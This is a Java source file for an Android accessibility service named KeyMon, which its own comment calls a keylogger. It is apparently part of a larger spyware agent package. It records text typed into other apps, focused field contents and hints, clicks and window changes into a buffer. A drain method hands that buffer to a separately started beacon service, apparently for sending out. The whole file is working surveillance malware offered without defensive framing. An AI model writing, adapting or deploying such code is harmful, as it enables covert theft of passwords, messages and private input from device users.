package com.hackit.agent;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayDeque;

/**
 * Accessibility keylogger. Text-bearing events and focused-node text are
 * folded into a bounded ring, shortened to a 400-entry flush per beacon so a
 * busy device never grows the outbox without limit.
 */
public class KeyMon extends AccessibilityService {
    private static final int RING_CAP = 800;
    private static final ArrayDeque<JSONObject> RING = new ArrayDeque<JSONObject>();
    private static volatile boolean connected;
    private static String lastHash = "";

    static boolean connected() {
        return connected;
    }

    static JSONArray drain(int limit) {
        JSONArray out = new JSONArray();
        synchronized (RING) {
            while (out.length() < limit && !RING.isEmpty()) {
                out.put(RING.poll());
            }
        }
        return out;
    }

    static void clear() {
        synchronized (RING) {
            RING.clear();
        }
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        connected = true;
        Log.d("accessibility on");
        BeaconService.start(this);
    }

    @Override
    public void onDestroy() {
        connected = false;
        super.onDestroy();
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }
        try {
            CharSequence pkg = event.getPackageName();
            String source = pkg == null ? "" : pkg.toString();
            if (source.equals(getPackageName())) {
                return;
            }
            int type = event.getEventType();
            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence text = event.getText() == null || event.getText().isEmpty()
                        ? null : event.getText().get(0);
                if (text != null) {
                    push(source, text.toString(), false);
                }
            } else if (type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                AccessibilityNodeInfo node = event.getSource();
                if (node != null) {
                    CharSequence text = node.getText();
                    CharSequence hint = Build.VERSION.SDK_INT >= 26 ? node.getHintText() : null;
                    if (hint == null && text == null) {
                        hint = node.getContentDescription();
                    }
                    String value = text != null ? text.toString() : hint == null ? "" : "[" + hint + "]";
                    if (!value.isEmpty()) {
                        push(source, value, true);
                    }
                    if (Build.VERSION.SDK_INT >= 21) {
                        node.recycle();
                    }
                }
            } else if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                CharSequence cls = event.getClassName();
                push(source, "<" + (cls == null ? "window" : cls.toString()) + ">", true);
            } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                CharSequence text = event.getText() == null || event.getText().isEmpty()
                        ? null : event.getText().get(0);
                if (text != null && text.length() > 0) {
                    push(source, text.toString(), true);
                }
            }
        } catch (Throwable exc) {
            Log.d("key: " + exc);
        }
    }

    private void push(String pkg, String text, boolean focus) {
        String trimmed = text.length() > 512 ? text.substring(0, 512) : text;
        String fingerprint = pkg + "\u0000" + trimmed;
        synchronized (RING) {
            if (fingerprint.equals(lastHash)) {
                return;
            }
            lastHash = fingerprint;
            try {
                JSONObject row = new JSONObject();
                row.put("pkg", pkg);
                row.put("text", trimmed);
                row.put("focus", focus);
                RING.addLast(row);
                while (RING.size() > RING_CAP) {
                    RING.pollFirst();
                }
            } catch (Exception ignored) {
            }
        }
    }
}
